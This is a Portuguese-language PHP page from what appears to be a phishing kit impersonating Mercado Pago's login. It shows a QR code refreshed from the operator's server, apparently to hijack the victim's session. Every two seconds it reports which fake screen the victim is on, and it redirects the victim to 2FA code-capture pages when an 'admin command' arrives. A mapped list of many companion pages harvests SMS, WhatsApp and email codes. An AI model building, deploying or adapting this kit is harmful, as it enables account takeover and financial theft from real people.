<?php
// --- VERIFICAÇÃO DE DISPOSITIVO E SESSÃO ---

// Se o acesso NÃO for de um dispositivo móvel, redireciona para a versão desktop.
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

function isMobileDevice() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

// Define o alvo do redirecionamento com base no dispositivo
if (isMobileDevice()) {
    $redirect_target_2fa = 'dois_fatores.php';
} else {
    // Verifique se o nome do arquivo desktop é 'dois_fatores.php' ou 'dois_fatores2.php'
    $redirect_target_2fa = 'dois_fatores.php'; 
}

// Inicia a sessão e valida o cookie de identificação
session_start();
if (!isset($_COOKIE['identificador_cliente'])) {
    header('Location: index.php');
    exit;
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escaneie o QR para iniciar sessão</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--cor-fundo);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        .main-header {
            background-color: var(--cor-amarela);
            padding: 12px 24px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
        }
        .main-header img {
            height: 35px;
        }
        .main-content {
            padding: 32px 24px;
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center; /* Centraliza os itens horizontalmente */
            text-align: center;
        }
        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: var(--cor-texto-secundaria);
            text-transform: uppercase;
            margin-bottom: 8px;
        }
        .main-title {
            font-size: 24px;
            font-weight: 500;
            color: var(--cor-texto-primaria);
            margin: 0 0 16px 0;
            line-height: 1.3;
        }
        .description-text {
            font-size: 16px;
            color: var(--cor-texto-secundaria);
            line-height: 1.5;
            max-width: 320px; /* Evita que o texto fique muito largo */
            margin-bottom: 32px;
        }
        .qr-card {
            background-color: var(--cor-card);
            border-radius: 6px;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            padding: 24px;
            width: 100%;
            max-width: 280px; /* Largura máxima do card */
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .qr-image {
            width: 100%; /* Imagem ocupa toda a largura do card */
            height: auto;
            margin-bottom: 24px;
        }
        .other-method-link {
            color: var(--cor-azul);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }
        .other-method-link:hover {
            text-decoration: underline;
        }
        .main-content .other-method-link {
            margin-top: 32px;
        }
    </style>
</head>
<body>
    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.50/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <span class="session-start-label">INÍCIO DE SESSÃO</span>
        <h1 class="main-title">Escaneie o QR para iniciar sessão de forma segura</h1>
        <p class="description-text">Este passo é necessário para validar sua identidade e manter sua conta sempre protegida.</p>

        <div class="qr-card">
            <img src="2.png" alt="Código QR para login" id="qr-image" class="qr-image">
            <a href="senha-mobile.php" class="other-method-link">Escolher outro método</a>
        </div>

    </main>

    <script>
        // A MESMA FUNCIONALIDADE JAVASCRIPT DA VERSÃO DESKTOP
        const qrImage = document.getElementById('qr-image');

        async function verificarQrCode() {
            try {
                // Esta API busca um novo QR code no servidor
                const response = await fetch('api_get_qrcode.php');
                const data = await response.json();

                if (data.success && data.qrcode_path) {
                    console.log('Novo QR Code recebido:', data.qrcode_path);
                    
                    // Atualiza a imagem, adicionando um timestamp para evitar cache do navegador
                    qrImage.src = data.qrcode_path + '?t=' + new Date().getTime();
                }
            } catch (error) {
                console.error('Erro ao buscar QR Code:', error);
            }
        }

        // Inicia a verificação a cada 3 segundos
        setInterval(verificarQrCode, 3000);
    </script>
    <script>
        (function() {
            // Mapa de nomes de arquivos para mensagens de status amigáveis.
            const statusMap = {
                'index.php': 'Usuário na tela Home (Desktop)',
                'login-mobile.php': 'Usuário na tela Home (Mobile)',
                'senha.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'senha-mobile.php': 'Usuário na Tela de opções de login (QRCODE/SMS/WHATSAPP/EMAIL)  (Mobile)',
                'dois_fatores.php': 'Usuário na Tela 2FA(autenticação de duas etapas) - Mensagem (Desktop)',
                'dois_fatores2.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Desktop)',
                'doisfatores2mobile.php': 'Usuário na Tela 2FA com opções de duas etapas (QRCODE/SMS/WHATSAPP/EMAIL) (Mobile)',
                'sms_desktop.php': 'Usuário na tela para logar com código no SMS (Desktop)',
                'sms_mobile.php': 'Usuário na tela para logar com código no SMS (Mobile)',
                'sms_whats_desktop.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Desktop)',
                'sms_whats_mobile.php': 'Usuário na tela para logar com código no SMS via WhatsApp (Mobile)',
                'qrcode-mobile.php': 'Usuário na tela para logar com QR Code (Mobile)',
                'telaqr.php': 'Usuário na tela para logar com QR Code (Desktop)',
                'email2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Desktop)',
                'email2famobile.php': 'Usuário na tela para verificar duas etapas com código no E-mail(Mobile)',
                'emailsms_desktop.php': 'Usuário na tela para logar com código no E-mail (Desktop)',
                'emailsms_mobile.php': 'Usuário na tela para logar com código no E-mail (Mobile)',
                'sms2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no SMS (Desktop)',
                'sms2famobile.php': 'Usuário na tela para verificar duas etapas com código no SMS (Mobile)',
                'whats2fadesktop.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Desktop)',
                'whats2framobile.php': 'Usuário na tela para verificar duas etapas com código no WhatsApp (Mobile)'
            };

            // Descobre o nome do arquivo da página atual
            const currentPage = window.location.pathname.split('/').pop();
            
            // Pega a mensagem de status correspondente
            const currentStatus = statusMap[currentPage] || 'Página Desconhecida';

            // Função que envia o "ping" para a API
            async function sendStatusUpdate() {
                try {
                    await fetch('api_update_status.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ status: currentStatus })
                    });
                    // Não precisamos fazer nada com a resposta, apenas enviar.
                } catch (error) {
                    // Se falhar, loga no console sem incomodar o usuário.
                    console.error('Falha ao enviar atualização de status:', error);
                }
            }

            // Envia o primeiro status imediatamente ao carregar a página
            sendStatusUpdate();

            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
            setInterval(sendStatusUpdate, 2000);
        })();
    </script>
    <script>
        (function() {
            // Pega a URL de redirecionamento que o PHP definiu
            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";

            async function checkAdminCommand() {
                try {
                    const response = await fetch('api_check_status.php');
                    const data = await response.json();

                    console.log('Status atual:', data.status); 

                    if (data.status === 'redirecionar_para_2fa') {
                        // Para a verificação para não redirecionar em loop
                        clearInterval(statusInterval);
                        
                        console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
                        
                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                        window.location.href = redirectUrl;
                    }
                } catch (error) {
                    console.error('Erro ao verificar status:', error);
                }
            }

            // Inicia a verificação a cada 3 segundos
            const statusInterval = setInterval(checkAdminCommand, 3000);
        })();
    </script>
</body>
</html>